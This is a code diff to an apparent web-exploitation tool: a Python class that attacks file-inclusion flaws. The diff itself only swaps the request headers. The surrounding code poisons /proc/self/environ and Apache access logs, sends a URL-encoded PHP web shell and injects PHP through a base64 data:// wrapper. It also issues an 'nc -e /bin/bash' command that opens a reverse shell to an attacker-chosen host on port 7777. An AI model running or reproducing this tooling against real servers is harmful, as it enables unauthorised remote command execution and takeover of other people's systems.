@@ -43,11 +43,14 @@ class Shell_conncet:
             request.set_handle_refresh(True, max_time=1)  
             if "proc/self/environ" in self.url or \
             "/var/log/apache2/access.log" in self.url  :
-                request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                     ('username',f'{self.args.user}'),
-                                     ('password',f'{self.args.password}'),
-                                     ('Cookie',str(self.Cookie).replace('\n',''))]
+                request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]
                         
                 path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                 run    = 'gnome-terminal  -- '+path
@@ -74,11 +77,14 @@ class Shell_conncet:
             if 'sessions' in self.url :
                 WebShell = "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"
                 WEB = self.args.Vulnurl+WebShell
-                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                     Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                     ('username',f'{self.args.user}'),
-                                     ('password',f'{self.args.password}'),
-                                     ('Cookie',str(self.Cookie).replace('\n',''))]
+                request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]
                         
                 path   =  "/usr/bin/python3  " +str(os.getcwd())+'/Package/shell/netcat.py'
                 run    = 'gnome-terminal  -- '+path
@@ -117,11 +123,14 @@ class Shell_conncet:
                 request.set_handle_robots(False)
                 request.set_handle_redirect(True)
                 request.set_handle_refresh(True, max_time=1)  
-                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                    ('Cookie',str(self.Cookie).replace('\n','')),
-                                    ('username',f'{self.args.user}'),
-                                    ('password',f'{self.args.password}')]  
+                request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]  
                 PHPWAPPER = "data://text/plain;base64,"                   
                 self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP   
                 try: 
@@ -210,11 +219,14 @@ class Shell_conncet:
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
                     request.set_handle_refresh(True, max_time=1)  
-                    request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
-                                        Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                        ('Cookie',str(self.Cookie).replace('\n','')),
-                                        ('username',f'{self.args.user}'),
-                                        ('password',f'{self.args.password}')]
+                    request.addheaders = [
+                                ("User-Agent", "curl/7.88.1"),
+                                ("Accept", "*/*"),
+                                ("Accept-Encoding", "identity"),
+                                ("Connection", "close"),
+                                ('Cookie',str(self.Cookie).replace('\n','')),
+                                ('username',f'{self.args.user}'),
+                                ('password',f'{self.args.password}')]
                     if not self.args.port:                    
                         command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                     else:
